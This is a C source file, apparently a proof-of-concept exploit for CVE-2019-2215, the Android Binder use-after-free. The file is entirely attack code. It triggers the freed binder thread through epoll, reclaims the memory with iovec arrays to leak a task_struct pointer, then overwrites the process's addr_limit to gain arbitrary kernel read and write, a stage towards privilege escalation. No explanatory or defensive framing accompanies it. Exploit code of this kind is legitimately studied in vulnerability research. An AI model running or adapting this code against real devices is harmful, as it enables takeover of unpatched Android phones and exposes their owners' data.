#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sched.h>
#include <stdlib.h>

#define BINDER_THREAD_EXIT 0x40046208ul
#define N_TARGET 25 //We need to realloc in kmalloc-512 and binder thread is 408. Each IOVEC is 16 so --> 25
#define WAIT_IOV 10
#define OFFSET_LIMIT 8

#define OPEN(file,flag) syscall(__NR_open, file, flag)
#define EPOLL_CREATE(size) syscall(__NR_epoll_create, size)
#define EPOLL_CTL(epoll, cmd, fd, event) syscall(__NR_epoll_ctl, epoll, cmd, fd, event)
#define IOCTL(fd, cmd, ptr) syscall(__NR_ioctl, fd, cmd, ptr)
#define SCHED_SETAFFINITY(a, b, c) syscall(__NR_sched_setaffinity, a, b, c)

struct epoll_event event = {.events = EPOLLIN};
int migrate_to_cpu0(void) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (SCHED_SETAFFINITY(0, sizeof(cpu_set_t), &set) < 0){
    perror("[:(] sched_setaffinity");
    return -1;
  }
  return 0;
}
void *dummy_page;
void* allocate_dummy_page(){
  if (dummy_page == (void*)0x100000000ul)
    return dummy_page;

  dummy_page = mmap((void*)0x100000000ul, 2*PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dummy_page != (void*)0x100000000ul) {
    printf("[:(] Dummy page allocated at 0x%016lx\n", dummy_page);
    return (void*)0xffffffffffffffff;
  }
  return dummy_page;
}
// Leak Task Structure {{{
uint64_t leak_task_structure(int binder_fd, int epoll_fd, void *dummy_page){
  struct iovec iS[N_TARGET];
  char read_buffer[2*PAGE_SIZE];
  int pipe_fd[2] = {0};
  int nRBytes;
  // Allocate a dummy page for spinlock
  if (dummy_page == (void*)0xffffffffffffffff)
  return (uint64_t)0xffffffffffffffff;
  memset(iS, 0, sizeof(iS));
  iS[WAIT_IOV].iov_base  = dummy_page; //Spinlock
  iS[WAIT_IOV].iov_len   = PAGE_SIZE;  // List head *next
  iS[WAIT_IOV+1].iov_base= (void*)dummy_page; // List head *prev;
  iS[WAIT_IOV+1].iov_len   = PAGE_SIZE;  // List head *next

  // Now, create the PIPE
  //pipe_fd[0] for reading, pipe_fd[1] for writing
  if (pipe(pipe_fd) == -1) {
    perror("[:(] Creating pipe");
  return (uint64_t)0xffffffffffffffff;
  }
  if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) != PAGE_SIZE) {
    perror("[:(] FCNTL with pipe");
  return (uint64_t)0xffffffffffffffff;
  }
  printf("[i] Pipe created!\n");
  // Fork
  int child_pid = fork();
  if (child_pid == 0){
    // Children
    sleep(2);
    printf("[i] Using the UAF object\n");
    EPOLL_CTL(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
    nRBytes=read(pipe_fd[0], read_buffer,PAGE_SIZE);
    if(nRBytes != PAGE_SIZE){
      printf("[:(] Readed 0x%x bytes instead of 0x%x\n", nRBytes, PAGE_SIZE);
  return (uint64_t)0xffffffffffffffff;
    }
    close(pipe_fd[1]);
    _exit(0);
  }
  else{
    // Parent
    // Free the sttructure and reallocate
    IOCTL(binder_fd, BINDER_THREAD_EXIT, 0x0);
    nRBytes = syscall(__NR_writev, pipe_fd[1], iS, N_TARGET);
    if (nRBytes != 2*PAGE_SIZE){
      printf("[:(] Written 0x%x bytes instead of 0x%x\n", nRBytes, 2*PAGE_SIZE);
  return (uint64_t)0xffffffffffffffff;
    }
    // I should wait my children...
    printf("[i] Waiting children\n");
    wait(nullptr);
    // Now, children should have readed from pipe and unlocked the writev. Now I read AFTER the unlink
    nRBytes = syscall(__NR_read, pipe_fd[0], read_buffer, PAGE_SIZE);
    if (nRBytes != PAGE_SIZE) {
      printf("[:(] Readed 0x%x bytes instead of 0x%x\n", nRBytes, PAGE_SIZE);
  return (uint64_t)0xffffffffffffffff;
  }
    printf("UAF 0x%16lx\n", *(uint64_t*)(read_buffer + 0xE8));
    uint64_t t_s = *(uint64_t*)(read_buffer+0xe8);
  return t_s;
  }
} // }}}
int main() {
    printf("\n\n");
    printf("-={CVE-2019-2215}=-\n");
    printf("-={Android Binder UAF}=-\n");
    printf("\n\n");

    uint64_t task_struct;
    int fd, epfd;
    printf("Press any char to continue\n");
    getchar();
    if (migrate_to_cpu0() != 0)
      return -1;
    fd = OPEN("/dev/binder", O_RDONLY);
    if (fd < 0) {
      perror("[:(] Failed to open binder driver");
      return -1;
    }
    printf("[i] Binder device opened\n");
  
    // Create epoll, size > 0 but is unused 
    epfd = EPOLL_CREATE(1);
    if (epfd < 0) {
      perror("[:(] Failed to create an epoll");
      return -1;
    } 
    printf("[i] epfd created %d\n",epfd); 
    void *dummy_page = allocate_dummy_page();
    // Add binder device to epoll
    EPOLL_CTL(epfd, EPOLL_CTL_ADD, fd, &event);

    task_struct = leak_task_structure(fd, epfd, dummy_page);
    printf("[:)] Binder UAF 0x%016lx\n", task_struct);
    printf("[i] Breaking the limits\n");
    struct iovec iS[N_TARGET];
    int sock_fd[2] = {0};
    memset(iS, 0, sizeof(iS));
#define OFFSET_ADDR_LIMIT 0xA18
    uint64_t second_write_chunk[] = {
      0x1, //iov_len
      0x41414141, //iov_base 
      0x8 + 0x10 + 0x10, // iov_len
      task_struct + OFFSET_ADDR_LIMIT, //next_iov_base
      8, //next iov_len
      0xfffffffffffffffe //value
    };
    EPOLL_CTL(epfd, EPOLL_CTL_ADD, fd, &event);
    struct iovec iovec_array[N_TARGET];
    memset(iovec_array, 0, sizeof(iovec_array));
    iovec_array[WAIT_IOV].iov_base = allocate_dummy_page() ;
    iovec_array[WAIT_IOV].iov_len  = 1;
    iovec_array[WAIT_IOV+1].iov_base = (void*)0x41414141;
    iovec_array[WAIT_IOV+1].iov_len = 0x8 + 0x10 +0x10;
    iovec_array[WAIT_IOV+2].iov_base = (void*)0xbeefdead;
    iovec_array[WAIT_IOV+2].iov_len = 8;

    if (socketpair(AF_UNIX, SOCK_STREAM,0, sock_fd)){
      perror("[:(] Failed to create socketpair");
      return -1;
    }
    if (write(sock_fd[1], "A", 1) != 1){
      perror("[:(] Writing failed");
      return -1;
    }

    // Forking now
    int pid = fork();
    if (pid == -1){
      perror("[:(] Forking error");
      return -1;
    }
    if (pid == 0) {
      // Child
      prctl(PR_SET_PDEATHSIG, SIGKILL);
      sleep(2);
      printf("Children is about to EPOLL_CTL_DEL\n");
      EPOLL_CTL(epfd, EPOLL_CTL_DEL, fd, &event);
      if (write(sock_fd[1], second_write_chunk, sizeof(second_write_chunk)) != sizeof(second_write_chunk)){
        perror("[:(] Writing the final chunk failed");
        return -1;
      }
      exit(0);
    }
    // Parent
    ioctl(fd, BINDER_THREAD_EXIT, NULL);
    struct msghdr msg = {
      .msg_iov = iovec_array,
      .msg_iovlen = N_TARGET
    };
    int recv = recvmsg(sock_fd[0], &msg, MSG_WAITALL);
    printf("[i] Received %d bytes, expected %lu\n", recv, (unsigned long)(iovec_array[WAIT_IOV].iov_len + iovec_array[WAIT_IOV+1].iov_len + iovec_array[WAIT_IOV+2].iov_len));
    // NOW, we have clobbered limits so we can write everywhere
    printf("Now we have a modified limits");
    getchar();
    return 0;
}
